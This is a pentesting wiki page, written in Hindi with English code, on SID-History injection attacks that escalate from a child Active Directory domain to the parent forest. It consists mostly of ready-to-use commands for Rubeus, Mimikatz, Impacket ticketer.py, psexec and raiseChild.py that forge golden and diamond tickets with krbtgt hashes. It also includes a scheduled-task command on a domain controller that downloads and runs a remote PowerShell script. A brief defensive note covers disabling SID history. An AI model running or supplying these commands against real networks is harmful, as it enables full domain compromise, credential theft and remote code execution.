# SID-History Injection

{{#include ../../banners/hacktricks-training.md}}

## SID History Injection Attack

**SID History Injection Attack** का ध्यान **डोमेन के बीच उपयोगकर्ता माइग्रेशन** में मदद करना है, जबकि पूर्व डोमेन से संसाधनों तक निरंतर पहुंच सुनिश्चित करना है। यह **उपयोगकर्ता के पिछले सुरक्षा पहचानकर्ता (SID) को उनके नए खाते के SID इतिहास में शामिल करके** किया जाता है। विशेष रूप से, इस प्रक्रिया का दुरुपयोग करके उच्च-विशेषाधिकार समूह (जैसे Enterprise Admins या Domain Admins) के SID को माता-पिता डोमेन से SID इतिहास में जोड़कर अनधिकृत पहुंच प्रदान की जा सकती है। यह शोषण माता-पिता डोमेन के भीतर सभी संसाधनों तक पहुंच प्रदान करता है।

इस हमले को निष्पादित करने के लिए दो तरीके हैं: या तो **Golden Ticket** या **Diamond Ticket** बनाने के माध्यम से।

**"Enterprise Admins"** समूह के लिए SID को पहचानने के लिए, सबसे पहले रूट डोमेन के SID को ढूंढना होगा। पहचान के बाद, Enterprise Admins समूह SID को रूट डोमेन के SID में `-519` जोड़कर बनाया जा सकता है। उदाहरण के लिए, यदि रूट डोमेन SID `S-1-5-21-280534878-1496970234-700767426` है, तो "Enterprise Admins" समूह के लिए परिणामस्वरूप SID `S-1-5-21-280534878-1496970234-700767426-519` होगा।

आप **Domain Admins** समूहों का भी उपयोग कर सकते हैं, जो **512** पर समाप्त होता है।

दूसरे डोमेन के एक समूह (उदाहरण के लिए "Domain Admins") का SID खोजने का एक और तरीका है:
```bash
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
> [!WARNING]
> ध्यान दें कि एक ट्रस्ट संबंध में SID इतिहास को अक्षम करना संभव है, जिससे यह हमला विफल हो जाएगा।

[**docs**](https://technet.microsoft.com/library/cc835085.aspx) के अनुसार:
- **नेटडॉम टूल का उपयोग करके फॉरेस्ट ट्रस्ट पर SIDHistory को अक्षम करना** (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
- **नेटडॉम टूल का उपयोग करके बाहरी ट्रस्ट पर SID फ़िल्टर क्वारंटाइन लागू करना** (`netdom trust /domain: /quarantine:yes on the domain controller`)
- **एकल फॉरेस्ट के भीतर डोमेन ट्रस्ट पर SID फ़िल्टरिंग लागू करना** अनुशंसित नहीं है क्योंकि यह एक असमर्थित कॉन्फ़िगरेशन है और इससे तोड़ने वाले परिवर्तन हो सकते हैं। यदि एक फॉरेस्ट के भीतर एक डोमेन अविश्वसनीय है, तो इसे फॉरेस्ट का सदस्य नहीं होना चाहिए। इस स्थिति में, पहले विश्वसनीय और अविश्वसनीय डोमेन को अलग-अलग फॉरेस्ट में विभाजित करना आवश्यक है जहां SID फ़िल्टरिंग को इंटरफॉरेस्ट ट्रस्ट पर लागू किया जा सके।

इस बारे में अधिक जानकारी के लिए इस पोस्ट की जांच करें: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)

### डायमंड टिकट (Rubeus + KRBTGT-AES256)

अंतिम बार जब मैंने यह कोशिश की थी, तो मुझे आर्ग **`/ldap`** जोड़ने की आवश्यकता थी।
```bash
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap

# Or a ptt with a golden ticket
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

#e.g.

execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd

# You can use "Administrator" as username or any other string
```
### Golden Ticket (Mimikatz) with KRBTGT-AES256
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
गोल्डन टिकट के बारे में अधिक जानकारी के लिए देखें:

{{#ref}}
golden-ticket.md
{{#endref}}


डायमंड टिकट के बारे में अधिक जानकारी के लिए देखें:

{{#ref}}
diamond-ticket.md
{{#endref}}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
समझौता किए गए डोमेन के KRBTGT हैश का उपयोग करके रूट या एंटरप्राइज एडमिन के DA में वृद्धि करें:
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
प्राप्त अनुमतियों के साथ आप नए डोमेन में उदाहरण के लिए DCSync हमला कर सकते हैं:

{{#ref}}
dcsync.md
{{#endref}}

### लिनक्स से

#### [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) के साथ मैनुअल
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
#### Automatic using [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)

यह एक Impacket स्क्रिप्ट है जो **बच्चे से माता-पिता के डोमेन में वृद्धि को स्वचालित करेगी**। स्क्रिप्ट को आवश्यकता है:

- लक्षित डोमेन नियंत्रक
- बच्चे के डोमेन में एक व्यवस्थापक उपयोगकर्ता के लिए क्रेडेंशियल्स

प्रवाह है:

- माता-पिता के डोमेन के एंटरप्राइज एडमिन्स समूह के लिए SID प्राप्त करता है
- बच्चे के डोमेन में KRBTGT खाते के लिए हैश पुनः प्राप्त करता है
- एक गोल्डन टिकट बनाता है
- माता-पिता के डोमेन में लॉग इन करता है
- माता-पिता के डोमेन में व्यवस्थापक खाते के लिए क्रेडेंशियल्स पुनः प्राप्त करता है
- यदि `target-exec` स्विच निर्दिष्ट किया गया है, तो यह Psexec के माध्यम से माता-पिता के डोमेन के डोमेन कंट्रोलर पर प्रमाणीकरण करता है।
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## संदर्भ

- [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
- [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)

{{#include ../../banners/hacktricks-training.md}}
